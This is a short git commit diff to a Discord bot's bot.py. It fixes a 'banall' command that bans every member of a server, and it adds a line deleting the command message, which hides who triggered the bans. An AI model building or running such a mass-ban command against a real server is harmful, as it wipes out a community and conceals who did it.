929260cc3e308f737195b4bed65ef9e4af9390af
Saadelamali <83782029+Saadelamali@users.noreply.github.com>
2021-05-28 02:20:26 +0000

    Update bot.py

--- bot.py
+++ bot.py
@@ -70,7 +70,8 @@ async def cda(ctx):
 
 @client.command()
 async def banall(ctx, reason : str):
+  await ctx.message.delete()
   for member in ctx.guild.members:
-  await member.ban(reason=reason)
+    await member.ban(reason=reason)
 
 client.run(token)
